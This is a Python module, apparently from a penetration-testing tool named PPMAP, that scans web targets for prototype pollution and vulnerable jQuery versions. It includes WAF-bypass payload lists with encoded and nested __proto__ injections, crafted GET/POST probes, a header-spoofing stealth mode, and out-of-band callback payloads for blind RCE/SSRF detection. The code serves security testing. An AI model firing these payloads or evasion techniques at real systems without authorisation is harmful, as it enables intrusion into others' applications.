"""Scanner engine for PPMAP: parameter discovery, CVE checks, and attack vectors.

This module consolidates scanning logic including async scanning, CVE databases,
prototype pollution verification, and WAF bypass techniques.
"""

import logging
import asyncio
import aiohttp
import requests
import re
import json
import time
from typing import List, Dict, Any, Tuple, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
from requests import RequestException

from .models import Finding, VulnerabilityType, Severity

logger = logging.getLogger(__name__)


# ============================================================================
# ASYNC SCANNER ENGINE
# ============================================================================
class AsyncScanner:
    """Async scanning engine for high-performance assessments"""

    def __init__(self, max_concurrent: int = 10, timeout: int = 30):
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        self.results = []
        self.semaphore = asyncio.Semaphore(max_concurrent)

    async def test_url_async(
        self, session: aiohttp.ClientSession, url: str, headers: Dict[str, str]
    ) -> Dict[str, Any]:
        """Test single URL asynchronously"""
        async with self.semaphore:
            try:
                # SSL check disabled for pentesting context
                async with session.get(
                    url,
                    headers=headers,
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(self.timeout),
                ) as resp:
                    content = await resp.text()
                    return {
                        "url": url,
                        "status": resp.status,
                        "content": content,
                        "headers": dict(resp.headers),
                        "success": True,
                    }
            except asyncio.TimeoutError:
                return {"url": url, "error": "Timeout", "success": False}
            except Exception as e:
                return {"url": url, "error": str(e), "success": False}

    async def scan_urls_async(
        self, urls: List[str], headers: Optional[Dict[str, str]] = None
    ) -> List[Dict[str, Any]]:
        """Scan multiple URLs concurrently"""
        if headers is None:
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}

        connector = aiohttp.TCPConnector(limit=self.max_concurrent)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.test_url_async(session, url, headers) for url in urls]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            return results

    def run_async_scan(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Wrapper to run async scan from sync context"""
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

        return loop.run_until_complete(self.scan_urls_async(urls))


# ============================================================================
# CVE DATABASE
# ============================================================================
class CVEDatabase:
    """Comprehensive CVE database for jQuery and related libraries"""

    CVE_MAP = {
        "jquery": {
            # CVE-2019-11358: Prototype Pollution via $.extend()
            # Affected: >= 1.0.3, < 3.4.0 (patched in 3.4.0)
            # NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-11358
            # BUG FIX: was '<3.5.0' — actual patch landed in 3.4.0
            "CVE-2019-11358": {
                "title": "jQuery Prototype Pollution via $.extend()",
                "affected_versions": ">=1.0.3 <3.4.0",
                "fixed_version": "3.4.0",
                "severity": "CRITICAL",
                "description": (
                    "jQuery.extend(true, {}, ...) does not filter __proto__ properties, "
                    "allowing attacker-controlled input to modify Object.prototype globally. "
                    "This can lead to privilege escalation, auth bypass, or XSS via gadget chains."
                ),
            },
            # CVE-2020-11022: HTML Prefilter XSS
            # Affected: >= 1.2, < 3.5.0 (patched in 3.5.0)
            # NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-11022
            "CVE-2020-11022": {
                "title": "jQuery HTML Prefilter XSS via .html()/.append()",
                "affected_versions": ">=1.2 <3.5.0",
                "fixed_version": "3.5.0",
                "severity": "HIGH",
                "description": (
                    "htmlPrefilter() uses a regex-only approach to neutralize self-closing tags. "
                    "Payloads like <style></style><img onerror=...> bypass the regex and execute "
                    "when passed to .html(), .append(), .after(), .before() etc."
                ),
            },
            # CVE-2020-11023: <option> element XSS
            # Affected: >= 1.0.3, < 3.5.0 (patched in 3.5.0 — same release as 11022)
            # NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-11023
            # BUG FIX: was '<3.5.1' with fixed_version='3.5.1' — both wrong, fix is in 3.5.0
            "CVE-2020-11023": {
                "title": "jQuery XSS via <option> element in .html()/.append()",
                "affected_versions": ">=1.0.3 <3.5.0",
                "fixed_version": "3.5.0",
                "severity": "HIGH",
                "description": (
                    "Passing HTML containing <option> elements with untrusted content to jQuery "
                    "DOM manipulation methods (.html(), .append(), etc.) can execute arbitrary code. "
                    "Added to CISA KEV (Known Exploited Vulnerabilities) catalog."
                ),
            },
            # CVE-2020-23064: DOM Manipulation XSS
            # Affected: >= 1.0.3, < 3.5.0
            # NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-23064
            # MISSING: This CVE was not in the original CVEDatabase at all
            "CVE-2020-23064": {
                "title": "jQuery DOM Manipulation XSS (.before/.after/.replaceWith)",
                "affected_versions": ">=1.0.3 <3.5.0",
                "fixed_version": "3.5.0",
                "severity": "HIGH",
                "description": (
                    "Subset of CVE-2020-11023. jQuery DOM manipulation methods .before(), .after(), "
                    ".replaceWith(), and similar do not sanitize HTML input, allowing XSS when "
                    "user-controlled data is passed to these methods without prior sanitization."
                ),
            },
            # CVE-2015-9251: Cross-domain AJAX auto-eval XSS
            # Affected: >= 1.0, < 3.0.0 (patched in 3.0.0 which removed the auto-eval converter)
            # NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-9251
            # BUG FIX: was '<2.2.0, >=3.0.0 <3.0.1' (wrong range) + desc was 'CSS import' (wrong)
            "CVE-2015-9251": {
                "title": "jQuery Cross-domain AJAX auto-eval XSS",
                "affected_versions": ">=1.0 <3.0.0",
                "fixed_version": "3.0.0",
                "severity": "MEDIUM",
                "description": (
                    "When jQuery makes cross-domain AJAX requests without specifying dataType, "
                    "responses with Content-Type: text/javascript are automatically eval()'d via "
                    "globalEval(). An attacker who can influence the AJAX response URL can achieve XSS."
                ),
            },
            # CVE-2012-6708: XSS via $.parseJSON
            # Affected: < 1.9.0
            # NVD: https://nvd.nist.gov/vuln/detail/CVE-2012-6708
            "CVE-2012-6708": {
                "title": "jQuery XSS via $.parseJSON and location.hash",
                "affected_versions": "<1.9.0",
                "fixed_version": "1.9.0",
                "severity": "MEDIUM",
                "description": (
                    "jQuery may execute arbitrary JavaScript when the document is navigated to "
                    "a specially crafted URL. jQuery used location.hash to select DOM elements "
                    "when the hash started with #, allowing XSS via hash-based selectors."
                ),
            },
            # CVE-2011-4969: XSS via XHR response
            # Affected: < 1.6.3
            # NVD: https://nvd.nist.gov/vuln/detail/CVE-2011-4969
            "CVE-2011-4969": {
                "title": "jQuery XSS via XHR response in .text()",
                "affected_versions": "<1.6.3",
                "fixed_version": "1.6.3",
                "severity": "MEDIUM",
                "description": (
                    "The .text() method improperly handles XHR responses, allowing XSS when "
                    "the response contains malicious script content in older jQuery versions."
                ),
            },
        },
        "lodash": {
            "CVE-2021-23337": {
                "title": "Lodash Prototype Pollution via template()",
                "affected_versions": "<4.17.21",
                "fixed_version": "4.17.21",
                "severity": "CRITICAL",
                "description": "Prototype pollution in lodash utility via template function, allowing arbitrary code execution",
            },
            "CVE-2020-8203": {
                "title": "Lodash Prototype Pollution via zipObjectDeep()",
                "affected_versions": "<4.17.16",
                "fixed_version": "4.17.16",
                "severity": "HIGH",
                "description": "Prototype pollution in lodash via zipObjectDeep and merge functions",
            },
            "CVE-2019-10744": {
                "title": "Lodash Prototype Pollution via defaultsDeep()",
                "affected_versions": "<4.17.12",
                "fixed_version": "4.17.12",
                "severity": "CRITICAL",
                "description": "Prototype pollution via _.defaultsDeep() allows manipulation of Object.prototype",
            },
        },
        "jquery-ui": {
            # CVE-2021-41182, 41183, 41184 — jQuery UI < 1.13.0
            "CVE-2021-41182": {
                "title": "jQuery UI XSS via Datepicker altField option",
                "affected_versions": "<1.13.0",
                "fixed_version": "1.13.0",
                "severity": "MEDIUM",
                "description": "XSS via Datepicker widget altField option accepting untrusted input",
            },
            "CVE-2021-41184": {
                "title": "jQuery UI XSS via .position() utility",
                "affected_versions": "<1.13.0",
                "fixed_version": "1.13.0",
                "severity": "MEDIUM",
                "description": 'XSS via the "of" option of the .position() utility from untrusted sources',
            },
            "CVE-2016-7103": {
                "title": "jQuery UI XSS via dialog closeText option",
                "affected_versions": ">=1.0.0 <1.12.0",
                "fixed_version": "1.12.0",
                "severity": "MEDIUM",
                "description": "XSS through the closeText option of the dialog widget when user input is passed",
            },
        },
    }

    @staticmethod
    def check_version(library: str, version: str) -> List[Dict[str, Any]]:
        """Check if library version has known CVEs"""
        vulns = []

        if library not in CVEDatabase.CVE_MAP:
            logger.debug(f"Library {library} not in CVE database")
            return vulns

        try:
            # Parse version string (e.g., "3.4.1" -> (3, 4, 1))
            version_parts = tuple(int(x) for x in version.split("."))

            for cve_id, cve_info in CVEDatabase.CVE_MAP[library].items():
                affected = cve_info["affected_versions"]

                # Simple version matching logic
                if CVEDatabase._is_version_affected(version_parts, affected):
                    vulns.append(
                        {
                            "cve": cve_id,
                            "title": cve_info["title"],
                            "severity": cve_info["severity"],
                            "description": cve_info["description"],
                            "affected_version": version,
                            "fixed_version": cve_info["fixed_version"],
                        }
                    )

        except Exception as e:
            logger.warning(f"Error checking CVE for {library} {version}: {e}")

        return vulns

    @staticmethod
    def _is_version_affected(
        version_tuple: Tuple[int, ...], affected_spec: str
    ) -> bool:
        """Check if version matches affected version spec.

        BUG-4 FIX: Multi-range specs like '<2.2.0, >=3.0.0 <3.0.1' are OR conditions
        (e.g., 'affected if in range A OR in range B'), not AND. Each comma-separated
        group is evaluated independently; if ANY group matches, version is affected.
        """
        try:
            # Split on comma to get OR groups
            or_groups = [s.strip() for s in affected_spec.split(",")]

            for group in or_groups:
                # Each group may have space-separated AND conditions (e.g., '>=3.0.0 <3.0.1')
                and_specs = group.split()
                group_met = True

                for spec in and_specs:
                    spec = spec.strip()
                    if not spec:
                        continue
                    condition_met = False

                    if spec.startswith(">="):
                        min_v = tuple(int(x) for x in spec[2:].split("."))
                        if version_tuple >= min_v:
                            condition_met = True
                    elif spec.startswith(">"):
                        min_v = tuple(int(x) for x in spec[1:].split("."))
                        if version_tuple > min_v:
                            condition_met = True
                    elif spec.startswith("<="):
                        max_v = tuple(int(x) for x in spec[2:].split("."))
                        if version_tuple <= max_v:
                            condition_met = True
                    elif spec.startswith("<"):
                        max_v = tuple(int(x) for x in spec[1:].split("."))
                        if version_tuple < max_v:
                            condition_met = True
                    elif spec.startswith("="):
                        eq_v = tuple(int(x) for x in spec[1:].split("."))
                        if version_tuple == eq_v:
                            condition_met = True

                    group_met = group_met and condition_met

                # If this OR group is satisfied, version is affected
                if group_met:
                    return True

            return False
        except Exception as e:
            logger.debug(f"Version matching error: {e}")
            return False


# ============================================================================
# VERIFICATION & PAYLOADS
# ============================================================================
class PrototypePollutionVerifier:
    """Verify PP with multiple methods and confidence scoring"""

    @staticmethod
    def verify_pollution(driver, prop: str, threshold=3) -> Dict:
        """Verify PP using multiple methods for confidence scoring"""
        results = {"verified": False, "methods": [], "confidence": 0}

        verification_scripts = {
            "direct_check": f"return Object.prototype['{prop}'] === true;",
            "new_object_check": f"return (new Object())['{prop}'] === true;",
            "hasOwnProperty_bypass": f"return '{prop}' in {{}};",
            "constructor_check": f"return ({{}}).constructor.prototype['{prop}'] === true;",
            "object_keys_check": f"var o = {{}}; return o['{prop}'] === true;",
            "enumerate_check": f"for(var k in Object.prototype) if(k === '{prop}') return true; return false;",
        }

        verified_count = 0
        try:
            for method, script in verification_scripts.items():
                try:
                    if driver.execute_script(script):
                        results["methods"].append(method)
                        verified_count += 1
                except:
                    pass

            if verified_count >= threshold:
                results["verified"] = True
                results["confidence"] = (
                    verified_count / len(verification_scripts)
                ) * 100
        except:
            pass

        return results


class WAFDetector:
    """Detect presence and type of Web Application Firewall"""

    WAF_SIGNATURES = {
        "Cloudflare": {
            "headers": {"Server": "cloudflare", "CF-RAY": None},
            "cookies": ["__cfduid", "cf_clearance"],
        },
        "AWS WAF": {
            "headers": {
                "X-Amz-Cf-Id": None,
                "X-Amzn-Trace-Id": None,
                "Server": "Awselb",
            },
            "content": ["Request blocked"],
        },
        "Akamai": {"headers": {"Server": "AkamaiGHost", "X-Akamai-Request-ID": None}},
        "F5 BIG-IP": {
            "headers": {"X-Cnection": None},
            "cookies": ["BigIP", "BIGipServer"],
        },
        "Imperva Incapsula": {
            "headers": {"X-Iinfo": None, "X-CDN": "Incapsula"},
            "cookies": ["incap_ses", "visid_incap"],
        },
        "ModSecurity": {
            "headers": {"Server": "ModSecurity"},
            "content": ["ModSecurity Action", "Not Acceptable"],
        },
        "Sucuri": {"headers": {"Server": "Sucuri/Cloudproxy", "X-Sucuri-ID": None}},
    }

    @staticmethod
    def detect(response: requests.Response) -> Optional[str]:
        """Identify WAF based on response headers, cookies, and content"""
        detected = set()

        # Check Headers
        for waf_name, signs in WAFDetector.WAF_SIGNATURES.items():
            # Check headers
            if "headers" in signs:
                for h_name, h_val in signs["headers"].items():
                    if h_name in response.headers:
                        if (
                            h_val is None
                            or h_val.lower() in response.headers[h_name].lower()
                        ):
                            detected.add(waf_name)

            # Check cookies
            if "cookies" in signs:
                for cookie in signs["cookies"]:
                    for c in response.cookies:
                        if cookie.lower() in c.name.lower():
                            detected.add(waf_name)

            # Check content body (only if blocked)
            if response.status_code >= 400 and "content" in signs:
                for pattern in signs["content"]:
                    if pattern in response.text:
                        detected.add(waf_name)

        if detected:
            return ", ".join(detected)
        return None


class WAFBypassPayloads:
    """Advanced WAF bypass techniques"""

    @staticmethod
    def get_bypass_payloads(base_prop: str) -> Dict[str, List[str]]:
        """Generate WAF bypass payload variations"""
        return {
            "case_variation": [
                f"?__PROTO__[{base_prop}]=true",
                f"?__Proto__[{base_prop}]=true",
                f"?__proto__[{base_prop}]=true",
                f"?CONSTRUCTOR[PROTOTYPE][{base_prop}]=true",
            ],
            "url_encoding": [
                f"?__proto__%5B{base_prop}%5D=true",
                f"?%5F%5Fproto%5F%5F[{base_prop}]=true",
                f"?__proto__%255B{base_prop}%255D=true",
            ],
            "nested_objects": [
                f"?a[b][__proto__][{base_prop}]=true",
                f"?foo[bar][__proto__][{base_prop}]=true",
                f"?data[meta][__proto__][{base_prop}]=true",
            ],
            "json_payloads": [
                f'{{"__proto__": {{"{base_prop}": true}}}}',
                f'{{"constructor": {{"prototype": {{"{base_prop}": true}}}}}}',
                f'{{"a": {{"__proto__": {{"{base_prop}": true}}}}}}',
            ],
        }


# ============================================================================
# DISCOVERY
# ============================================================================
class EndpointDiscovery:
    """Discover endpoints and parameters for testing"""

    def __init__(self, session=None, timeout=10):
        self.session = session or requests.Session()
        self.timeout = timeout

    def discover_endpoints(self, base_url: str, depth=1, max_endpoints=50) -> List[str]:
        """Crawl and discover endpoints"""
        logger.info(f"Discovering endpoints (depth={depth}) for {base_url}...")

        discovered = set()
        to_visit = [(base_url, 0)]
        visited = set()

        try:
            while to_visit and len(discovered) < max_endpoints:
                current_url, current_depth = to_visit.pop(0)
                if current_url in visited or current_depth > depth:
                    continue

                visited.add(current_url)

                try:
                    resp = self.session.get(
                        current_url, timeout=self.timeout, verify=False
                    )
                    if resp.status_code != 200:
                        continue

                    soup = BeautifulSoup(resp.text, "html.parser")

                    for link in soup.find_all("a", href=True):
                        href = link["href"]
                        absolute_url = urljoin(current_url, href)
                        base_netloc = urlparse(base_url).netloc
                        current_netloc = urlparse(absolute_url).netloc

                        if base_netloc == current_netloc:
                            discovered.add(absolute_url)
                            if current_depth < depth:
                                to_visit.append((absolute_url, current_depth + 1))
                                
                    # Phase 8: Extract API endpoints hidden inside JavaScript / Inline handlers via RegEx
                    import re
                    # Match relative paths like "/api/..." or absolute like "http://..." inside quotes
                    regex_patterns = [
                        r'[\'"](?:GET|POST|PUT|DELETE)?\s*(/(?:api/)?[a-zA-Z0-9_\-./?&=]+)[\'"]',
                        r'window\.open\(.*?[\'"](/[a-zA-Z0-9_\-./?&=]+)[\'"]',
                        r'fetch\(.*?[\'"](/[a-zA-Z0-9_\-./?&=]+)[\'"]'
                    ]
                    
                    # Search inside all scripts
                    for script in soup.find_all("script"):
                        content = script.string or ""
                        for pattern in regex_patterns:
                            for match in re.findall(pattern, content):
                                abs_js_url = urljoin(current_url, match)
                                if urlparse(abs_js_url).netloc == urlparse(base_url).netloc:
                                    discovered.add(abs_js_url)
                                    if current_depth < depth:
                                        to_visit.append((abs_js_url, current_depth + 1))
                                        
                    # Search inside onclick/inline handlers on ANY tag
                    for tag in soup.find_all(True):
                        for attr in tag.attrs:
                            if attr.startswith('on'): # onclick, onsubmit, onmouseover, etc
                                content = str(tag[attr])
                                for pattern in regex_patterns:
                                    for match in re.findall(pattern, content):
                                        abs_inline_url = urljoin(current_url, match)
                                        if urlparse(abs_inline_url).netloc == urlparse(base_url).netloc:
                                            discovered.add(abs_inline_url)
                                            if current_depth < depth:
                                                to_visit.append((abs_inline_url, current_depth + 1))
                except Exception as e:
                    logger.debug(f"Deep discovery error at {current_url}: {e}")
                    continue
        except Exception as e:
            logger.warning(f"Endpoint discovery failed: {str(e)[:100]}")

        endpoints = list(discovered)[:max_endpoints]
        logger.info(f"Discovered {len(endpoints)} endpoints")
        return endpoints


class ParameterDiscovery:
    """Discover parameters from HTML forms and links (non-destructive)."""

    def __init__(
        self,
        session: requests.Session = None,
        timeout: int = 10,
        verify_ssl: bool = True,
    ):
        self.session = session or requests.Session()
        self.timeout = timeout
        self.verify_ssl = verify_ssl

    def analyze_forms(self, url: str) -> List[str]:
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)
            if resp.status_code != 200:
                return []
            soup = BeautifulSoup(resp.text, "html.parser")
            params = set()
            for form in soup.find_all("form"):
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if name and name.strip():
                        params.add(name.strip())
            for link in soup.find_all("a", href=True):
                href = link.get("href", "")
                parsed = urlparse(href)
                if parsed.query:
                    qs = parse_qs(parsed.query)
                    params.update(qs.keys())
            # BUG-9 FIX: Don't inject noisy generic fallback params — return empty list
            # if nothing discovered. Callers should handle empty list gracefully.
            return sorted(list(params))
        except RequestException as e:
            logger.debug(f"ParameterDiscovery error for {url}: {e}")
            return []


# ============================================================================
# COMPREHENSIVE SCANNER WRAPPER
# ============================================================================
class CompleteSecurityScanner:
    """High-level scanner wrapper with simple discovery and server-side PP tests."""

    def __init__(
        self,
        timeout: int = 15,
        max_workers: int = 3,
        verify_ssl: bool = True,
        oob_enabled: bool = False,
        stealth: bool = False,
    ):
        self.timeout = timeout
        self.max_workers = max_workers
        self.verify_ssl = verify_ssl
        self.oob_enabled = oob_enabled
        self.stealth = stealth
        self.oob_detector = None

        # BUG-3 FIX: CompleteSecurityScanner needs self.session for OOB and request reuse
        self.session = requests.Session()

        # BUG-7 FIX: Apply stealth headers when stealth mode is enabled
        if stealth:
            self.session.headers.update(
                {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none",
                }
            )

        if self.oob_enabled:
            # Lazy import to avoid circular dependencies if any
            from ppmap.oob import OOBDetector

            self.oob_detector = OOBDetector()
            self.oob_detector.register()

    def _fetch(
        self, session: requests.Session, url: str, **kwargs
    ) -> requests.Response:
        return session.get(url, timeout=self.timeout, verify=self.verify_ssl, **kwargs)

    def _analyze_for_evidence(self, resp: requests.Response, marker: str) -> bool:
        try:
            if marker in resp.text:
                return True
            js = resp.json()
            if isinstance(js, dict):

                def _search(obj):
                    if isinstance(obj, dict):
                        for v in obj.values():
                            if _search(v):
                                return True
                    elif isinstance(obj, list):
                        for v in obj:
                            if _search(v):
                                return True
                    else:
                        return str(obj) == marker or (
                            isinstance(obj, str) and marker in obj
                        )
                    return False

                return _search(js)
        except Exception:
            pass
        return False

    def test_parameter_pollution(self, base_url: str, param: str) -> List[Finding]:
        findings: List[Finding] = []
        session = requests.Session()
        marker = "ppmap_marker_12345"

        # 1) Send GET with crafted param name
        try:
            crafted_params = {f"__proto__[{param}]": marker}
            parsed = urlparse(base_url)
            base_qs = parse_qs(parsed.query)
            merged = {
                **{k: v[0] for k, v in base_qs.items()},
                **{k: v for k, v in crafted_params.items()},
            }
            url_parts = list(parsed)
            url_parts[4] = urlencode(merged)
            crafted_url = urlunparse(url_parts)
            r = session.get(crafted_url, timeout=self.timeout, verify=self.verify_ssl)
            if self._analyze_for_evidence(r, marker):
                findings.append(
                    Finding(
                        type=VulnerabilityType.SERVER_SIDE_PP,
                        severity=Severity.HIGH,
                        name=f"server-side-prototype-pollution (param-name:{param})",
                        description=f"Parameter name injection produced reflected marker for {param}",
                        payload={"method": "GET", "url": crafted_url},
                        url=base_url,
                        verified=True,
                    )
                )
        except RequestException as e:
            findings.append(
                Finding(
                    type=VulnerabilityType.SERVER_SIDE_PP,
                    severity=Severity.INFO,
                    name="network-error-discovering-parameter",
                    description=str(e),
                    payload={"param": param},
                    url=base_url,
                    verified=False,
                )
            )

        # 2) Send JSON POST
        try:
            json_payload = {"__proto__": {param: marker}}
            r2 = session.post(
                base_url,
                json=json_payload,
                timeout=self.timeout,
                verify=self.verify_ssl,
            )
            if self._analyze_for_evidence(r2, marker):
                findings.append(
                    Finding(
                        type=VulnerabilityType.SERVER_SIDE_PP,
                        severity=Severity.HIGH,
                        name=f"server-side-prototype-pollution-post (param:{param})",
                        description="JSON body with __proto__ key reflected in response",
                        payload={"method": "POST", "json": json_payload},
                        url=base_url,
                        verified=True,
                    )
                )
        except RequestException as e:
            logger.debug(f"POST test error for {base_url}: {e}")

        # 3) OOB / Blind Checks (v4.0)
        if self.oob_enabled and self.oob_detector and self.oob_detector.session_valid:
            try:
                from utils.payloads import SERVER_SIDE_PP_PAYLOADS

                oob_payloads = SERVER_SIDE_PP_PAYLOADS.get("blind_oob", [])

                oob_domain = self.oob_detector.get_payload_domain()

                for raw_payload in oob_payloads:
                    # Replace %OOB% with actual domain
                    payload_str = raw_payload.replace("%OOB%", oob_domain)

                    try:
                        # Try parsing as JSON first
                        payload_json = json.loads(payload_str)
                        # Inject into __proto__ structure if possible, logic depends on payload
                        # The payload strings in utils are already full JSON: '{"__proto__": ...}'

                        # Send Payload
                        self.session.post(
                            base_url,
                            json=payload_json,
                            timeout=self.timeout,
                            verify=self.verify_ssl,
                        )

                        # We don't verify immediately, we poll later or accumulating.
                        # But for this simple flow, we can poll after a batch or immediately?
                        # Polling too fast might miss it.
                        pass
                    except:
                        pass

                # Check for interactions (simple check after batch)
                time.sleep(2)  # Wait for DNS propagation/callback
                interactions = self.oob_detector.poll()
                if interactions:
                    for i in interactions:
                        findings.append(
                            Finding(
                                type=VulnerabilityType.SERVER_SIDE_PP,
                                severity=Severity.CRITICAL,
                                name="blind-server-side-pp-oob",
                                description=f"Received OOB interaction from {i.get('remote-address')} via {i.get('protocol')}",
                                payload={"oob_domain": oob_domain},
                                url=base_url,
                                verified=True,
                                note="Confirmed blind RCE/SSRF via Prototype Pollution",
                            )
                        )
                        logging.critical(
                            "[!] CRITICAL: OOB Interaction received! Blind PP Confirmed."
                        )
            except Exception as e:
                logger.debug(f"OOB test error: {e}")

        return findings

    def scan_target(self, target_url: str) -> List[Finding]:
        logger.info(f"Scanning {target_url} (timeout={self.timeout})")
        findings: List[Finding] = []

        # 1. Parameter Discovery
        pd = ParameterDiscovery(timeout=self.timeout, verify_ssl=self.verify_ssl)
        params = pd.analyze_forms(target_url)

        # 2. Server-Side PP Tests on params
        for p in params:
            try:
                fnds = self.test_parameter_pollution(target_url, p)
                findings.extend(fnds)
            except Exception as e:
                logger.debug(f"Test error for param {p}: {e}")

        # 3. jQuery Version Check (integrated from original)
        findings.extend(self.scan_jquery_version(target_url))

        return findings

    def scan_jquery_version(self, url: str) -> List[Finding]:
        fnds: List[Finding] = []
        try:
            s = requests.Session()
            r = s.get(url, timeout=self.timeout, verify=self.verify_ssl)
            text = r.text
            patterns = [
                r"jQuery v?(\d+\.\d+\.\d+)",
                r"jquery-(\d+\.\d+\.\d+)",
                r"jquery\s*:\s*'?(\d+\.\d+\.\d+)'?",
            ]
            versions = set()
            for p in patterns:
                for m in re.findall(p, text, flags=re.IGNORECASE):
                    versions.add(m)

            if versions:
                for ver in versions:
                    # Check CVE Database
                    vulns = CVEDatabase.check_version("jquery", ver)
                    if vulns:
                        for v in vulns:
                            fnds.append(
                                Finding(
                                    type=VulnerabilityType.CVE,
                                    severity=getattr(
                                        Severity, v["severity"], Severity.MEDIUM
                                    ),
                                    name=f"CVE-{v['cve']}",
                                    description=f"{v['title']} (Fixed in {v['fixed_version']})",
                                    url=url,
                                    cve=v["cve"],
                                    verified=True,
                                )
                            )
                    else:
                        fnds.append(
                            Finding(
                                type=VulnerabilityType.JQUERY_PP,
                                severity=Severity.INFO,
                                name=f"jquery-detected-{ver}",
                                description=f"Found jQuery version string: {ver}",
                                url=url,
                                verified=False,
                            )
                        )
        except RequestException:
            pass
        return fnds


class QuickPoC:
    """Quick PoC runner using Selenium if available."""

    def __init__(self, headless: bool = True):
        self.headless = headless
        self.driver = None

    def setup_browser(self, target_url: str) -> bool:
        # Use centralized browser helper
        try:
            from .browser import get_browser

            self.browser = get_browser(headless=self.headless)
            if self.browser:
                self.browser.get(target_url)
                return True
        except Exception as e:
            logger.warning(f"QuickPoC browser init failed: {e}")
        return False

    def test_payload(self, payload: dict) -> bool:
        if not hasattr(self, "browser") or not self.browser:
            raise RuntimeError("Browser not initialized")
        try:
            script = f"$.extend(true, {{}}, {json.dumps(payload)}); return true;"
            return bool(self.browser.execute_script(script))
        except Exception as e:
            logger.debug(f"QuickPoC test_payload error: {e}")
            return False

    def cleanup(self):
        try:
            if hasattr(self, "browser") and self.browser:
                self.browser.close()
        except Exception:
            pass
